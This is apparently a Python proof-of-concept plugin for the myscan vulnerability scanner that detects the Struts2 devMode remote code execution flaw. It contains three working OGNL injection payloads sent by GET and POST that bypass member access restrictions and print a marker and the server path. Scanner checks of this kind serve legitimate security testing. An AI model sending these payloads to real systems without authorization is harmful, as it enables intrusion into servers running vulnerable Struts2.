#!/usr/bin/env python3
# @Time    : 2020-04-08
# @Author  : caicai
# @File    : poc_struts2_dev.py

import copy
from myscan.lib.helper.request import request
from myscan.lib.core.common import get_random_num
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.parse.response_parser import response_parser
from myscan.config import scan_set

class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "Struts2-Dev"
        self.vulmsg = "Struts2-Dev远程代码执行"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 添加限定条件
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        if self.dictdata.get("url").get("extension").lower() not in ["do","action",""]:
            return

        check = b'<Struts2-vuln-Check>'
        payloads = [
            r"debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().print(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D)))(#context[#parameters.rpsobj[0]].getWriter().print('Check>')):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=<Struts2-vuln-&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest",
            r"debug=browser&object=%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2c%23res%3d@org.apache.struts2.ServletActionContext@getResponse%28%29%2c%23w%3d%23res.getWriter%28%29%2c%23w.print%28%27<Struts2-vuln%27%2b%27-Check>%27%29%29",
            r"debug=browser&object=(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),%23w.print('Check>'))&pp=Struts2-vuln-"
        ]
        headers=copy.deepcopy(self.dictdata.get("request").get("headers"))
        headers['Content-Type'] = 'application/x-www-form-urlencoded'

        for payload in payloads:
            for method in ["GET","POST"]:
                req={
                    "url":self.url+"?"+payload if method=="GET" else self.url,
                    "method":method,
                    "headers":headers,
                    "data":payload if method=="POST" else "",
                    "verify":False,
                    "timeout":10,
                }
                r=request(**req)
                if r!=None :
                    if check in r.content:
                        parser_=response_parser(r)
                        self.result.append({
                            "name": self.name,
                            "url": self.url,
                            "level": self.level,  # 0:Low  1:Medium 2:High
                            "detail": {
                                "vulmsg": self.vulmsg,
                                "request":parser_.getrequestraw(),
                                "response":parser_.getresponseraw(),
                            }
                        })
                        return
